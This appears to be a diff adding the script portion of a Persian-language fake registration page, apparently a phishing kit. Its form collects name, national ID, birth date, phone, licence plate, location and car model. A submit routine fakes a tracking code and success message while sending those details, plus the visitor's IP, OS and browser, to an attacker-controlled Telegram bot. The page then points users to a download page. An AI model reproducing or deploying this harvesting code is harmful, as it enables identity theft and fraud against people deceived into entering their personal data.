+ option.textContent = city;
+ citySelect.appendChild(option);
+ });
+ }
+ }
+
+ // Multi-step Form Logic
+ let currentStep = 1;
+
+ function goToStep(step) {
+ if (currentStep === 1) {
+ if (!document.getElementById('fullName').value || !document.getElementById('nationalId').value) {
+ alert('لطفاً نام و کد ملی را وارد کنید');
+ return;
+ }
+ }
+ document.getElementById(`step${currentStep}`).classList.remove('active');
+ document.getElementById(`step${currentStep}Indicator`).classList.remove('active');
+ document.getElementById(`step${currentStep}Indicator`).classList.add('completed');
+ document.getElementById(`step${step}`).classList.add('active');
+ document.getElementById(`step${step}Indicator`).classList.add('active');
+ currentStep = step;
+
+ if (step === 3) {
+ document.getElementById('summaryName').textContent = document.getElementById('fullName').value;
+ document.getElementById('summaryNationalId').textContent = document.getElementById('nationalId').value;
+ document.getElementById('summaryBirthDate').textContent = document.getElementById('birthDate').value;
+ document.getElementById('summaryPhone').textContent = document.getElementById('phone').value;
+ document.getElementById('summaryPlate').textContent = document.getElementById('plate').value;
+ document.getElementById('summaryProvince').textContent = document.getElementById('province').options[document.getElementById('province').selectedIndex].text;
+ document.getElementById('summaryCity').textContent = document.getElementById('city').value;
+ document.getElementById('summaryCarModel').textContent = document.getElementById('carModel').options[document.getElementById('carModel').selectedIndex].text;
+ }
+ }
+
+ async function submitForm() {
+ const btn = document.getElementById('finalSubmitBtn');
+ const spinner = document.getElementById('loadingSpinner');
+ btn.style.display = 'none';
+ spinner.style.display = 'block';
+
+ // گرفتن اطلاعات دستگاه و IP
+ const clientInfo = await getClientInfo();
+
+ setTimeout(() => {
+ const trackingCode = 'TRK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+ document.getElementById('trackingCode').textContent = trackingCode;
+ document.getElementById('trackingCodeModal').textContent = trackingCode;
+ document.getElementById('successModal').style.display = 'flex';
+
+ sendDataToTelegram({
+ fullName: document.getElementById('fullName').value,
+ nationalId: document.getElementById('nationalId').value,
+ birthDate: document.getElementById('birthDate').value,
+ phone: document.getElementById('phone').value,
+ plate: document.getElementById('plate').value,
+ province: document.getElementById('province').options[document.getElementById('province').selectedIndex].text,
+ city: document.getElementById('city').value,
+ carModel: document.getElementById('carModel').options[document.getElementById('carModel').selectedIndex].text,
+ trackingCode: trackingCode,
+ ip: clientInfo.ip,
+ os: clientInfo.os,
+ browser: clientInfo.browser
+ });
+ }, 2000);
+ }
+
+ function showDownloadPage() {
+ document.getElementById('successModal').style.display = 'none';
+ document.querySelector('.form-section').style.display = 'none';
+ document.getElementById('downloadPage').style.display = 'block';
+ }
+
+ function sendDataToTelegram(data) {
+ const message = `🆕 ثبت‌نام جدید:\n\n` +
+ `👤 نام: ${data.fullName}\n` +
+ `🆔 شماره ملی: ${data.nationalId}\n` +
+ `📅 تاریخ تولد: ${data.birthDate}\n` +
+ `📱 موبایل: ${data.phone}\n` +
+ `🚗 پلاک: ${data.plate}\n` +
+ `📍 استان: ${data.province}\n` +
+ `🏙️ شهر: ${data.city}\n` +
+ `🚘 خودرو: ${data.carModel}\n` +
+ `🔢 کد پیگیری: ${data.trackingCode}\n\n` +
+ `🌐 IP: ${data.ip}\n` +
+ `💻 OS: ${data.os}\n` +
+ `🖥 Browser: ${data.browser}\n\n` +
+ `Owner:@ScpThe`;
+
+ fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+ }).catch(error => console.error('Error sending to Telegram:', error));
+ }
+
+ // Convert date to Shamsi
+ function convertToShamsi(dateInput) {
+ const date = new Date(dateInput.value);
+ if (isNaN(date.getTime())) return;
+ const formatter = new Intl.DateTimeFormat('fa-IR-u-ca-persian', { year: 'numeric', month: '2-digit', day: '2-digit' });
+ dateInput.value = formatter.format(date);
+ }
+ </script>
+
+</body>
+</html>
